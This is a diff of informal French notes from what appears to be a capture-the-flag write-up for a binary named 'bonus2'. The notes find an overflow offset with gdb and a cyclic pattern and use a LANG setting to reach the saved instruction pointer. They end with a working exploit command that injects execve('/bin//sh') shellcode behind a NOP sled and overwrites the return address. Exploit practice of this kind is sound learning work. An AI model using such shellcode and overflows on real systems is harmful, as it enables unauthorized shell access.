@@ -1,4 +1,27 @@
 on peut voir avec gdb que le programme prends 2 arguments.
 les buffers font 40 pour le premier argument et 32
 
+
+on va tanter de trouver loffset 
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+0x08004242
+
+export LANG="fi"
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+0x42424242
+c'est bon !
+
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab
+0x41366141
+
+on est a un offset de 18
+
+on se rend compts que l'eip a pas etait entierment recrit 
+
+
+il reste plus qu'a recup l'adresse de la string, on s'arret juste apres le memecpy
+b *0x08048629
+x/s $esp
+
+
 ./bonus2 `python -c "print('\x90' * 15 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')"` `python -c "print('B' * 18 + '\xbf\xff\xf6\x15'[::-1])"`
